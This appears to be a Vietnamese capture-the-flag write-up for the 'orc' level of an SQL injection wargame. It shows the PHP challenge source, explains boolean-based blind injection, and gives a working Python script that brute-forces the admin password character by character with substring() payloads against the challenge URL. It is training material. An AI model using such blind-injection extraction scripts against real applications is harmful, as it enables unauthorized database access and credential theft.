orc
===
### Desscription
- Source
```
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
```

### Solution
- Phân tích code: Chúng ta có tham số truyền vào là `pw` được filter như những bài trước để chống attack vào các table khác của database. Để in ra được `Hello admin` thì ta có truyền vào `?pw=' or 1=1-- -`.
- Để có thể giải quyết bài này thì `pw` của mình truyền vào phải bằng với `pw` trả về trong database. 
- Kiểm tra `pw` trong database có độ dài là bao nhiêu thì ta có thể brute bằng burp ở phần intruder `?pw='or 1=1 and length(pw)=$$`

#### Payload
```
import requests
import string

url="https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
header = {'Cookie':'PHPSESSID=nmorf4kptpi5u8rsn3skhts4j0'}
flag = ''


for i in range(1,256):
	for j in string.printable:
		temp = flag+j
		param = "pw=' or 1=1 and substring(pw,1,{})='{}'-- -".format(i,temp)
		print(param)
		r = requests.get(url=url,params=param,headers=header)
		if "Hello admin" in r.text:
			flag += j
			print(flag)
			break
	if len(flag)==8:
		exit(0)
```
- Lưu ý thay Cookie ở phiên đăng nhập của bạn